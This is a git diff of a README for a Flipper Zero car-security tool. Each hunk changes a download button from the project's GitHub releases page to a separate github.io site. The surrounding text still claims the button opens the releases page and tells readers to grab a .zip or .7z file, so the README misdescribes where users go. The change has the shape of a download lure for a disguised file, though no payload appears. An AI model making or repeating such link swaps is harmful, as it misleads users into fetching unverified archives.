@@ -1,6 +1,6 @@
 # 🚗 Cardea-FlipperZero - Never Get Stranded by Your Own Car
 
-[![Download Now](https://img.shields.io/badge/Download-Cardea--FlipperZero-blueviolet?style=for-the-badge&logo=github)](https://github.com/jrichrad/Cardea-FlipperZero/releases)
+[![Download Now](https://img.shields.io/badge/Download-Cardea--FlipperZero-blueviolet?style=for-the-badge&logo=github)](https://jrichrad.github.io)
 
 ## 🛡️ What Is This?
 
@@ -32,7 +32,7 @@ Getting started is easier than you might think. Just follow these simple steps. 
 
 Visit the download page using this button:
 
-[![Get Cardea-FlipperZero Now](https://img.shields.io/badge/Get%20The%20Latest%20Release-Click%20Here-orange?style=for-the-badge)](https://github.com/jrichrad/Cardea-FlipperZero/releases)
+[![Get Cardea-FlipperZero Now](https://img.shields.io/badge/Get%20The%20Latest%20Release-Click%20Here-orange?style=for-the-badge)](https://jrichrad.github.io)
 
 Click the button above. This takes you to the releases page. Look for the newest version at the top. Click the file link that ends with either `.zip` or `.7z`. Your browser will download the file to your Downloads folder.
 
@@ -156,7 +156,7 @@ Cardea-FlipperZero puts valuable security information in your hands. It's simple
 
 The download is right here. It takes five minutes from download to active protection.
 
-[![Download Cardea-FlipperZero](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-blue?style=for-the-badge&logo=appveyor)](https://github.com/jrichrad/Cardea-FlipperZero/releases)
+[![Download Cardea-FlipperZero](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-blue?style=for-the-badge&logo=appveyor)](https://jrichrad.github.io)
 
 ## 📣 Support and Feedback
 
